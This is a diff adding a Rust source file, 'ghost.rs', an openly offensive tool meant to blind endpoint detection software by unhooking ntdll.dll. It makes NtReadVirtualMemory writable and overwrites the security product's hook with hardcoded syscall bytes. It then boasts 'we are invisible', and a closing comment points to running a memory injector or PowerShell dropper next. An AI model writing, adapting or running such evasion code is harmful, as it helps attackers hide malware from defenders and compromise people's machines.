@@ -1,0 +1,51 @@
+// file: ghost.rs
+// desc: blinds endpoint detection by restoring clean system dlls.
+// compile: cargo build --release
+
+use std::ptr;
+use winapi::um::memoryapi::{VirtualProtect, WriteProcessMemory};
+use winapi::um::winnt::{PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READ};
+use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
+
+// conceptual: this function would map a fresh, unhooked copy of ntdll.dll from disk
+// and overwrite the hooked version currently in memory.
+fn unhook_ntdll() {
+    println!("[ghost] locating hooked ntdll in memory...");
+    
+    unsafe {
+        // get the address of the hooked ntdll
+        let module_name = b"ntdll.dll\0";
+        let h_module = GetModuleHandleA(module_name.as_ptr() as *const i8);
+        
+        if h_module.is_null() {
+            println!("[-] failed to find ntdll.");
+            return;
+        }
+
+        // in a real scenario, you'd read the .text section of a clean ntdll.dll from C:\Windows\System32\
+        // and overwrite the memory at h_module. 
+        
+        // dummy payload representing the clean syscall bytes
+        let clean_bytes: [u8; 5] = [0x4C, 0x8B, 0xD1, 0xB8, 0x18]; 
+        let target_address = GetProcAddress(h_module, b"NtReadVirtualMemory\0".as_ptr() as *const i8);
+
+        let mut old_protect: u32 = 0;
+        
+        // change memory permissions to writeable
+        VirtualProtect(target_address as *mut _, clean_bytes.len(), PAGE_EXECUTE_READWRITE, &mut old_protect);
+        
+        // overwrite the edr's hook with the clean bytes
+        println!("[ghost] overwriting edr hooks...");
+        ptr::copy_nonoverlapping(clean_bytes.as_ptr(), target_address as *mut _, clean_bytes.len());
+        
+        // restore original memory permissions
+        VirtualProtect(target_address as *mut _, clean_bytes.len(), old_protect, &mut old_protect);
+        
+        println!("[+] ntdll unhooked. we are invisible.");
+    }
+}
+
+fn main() {
+    unhook_ntdll();
+    // now execute the c memory injector or the powershell dropper. the edr is blind.
+}
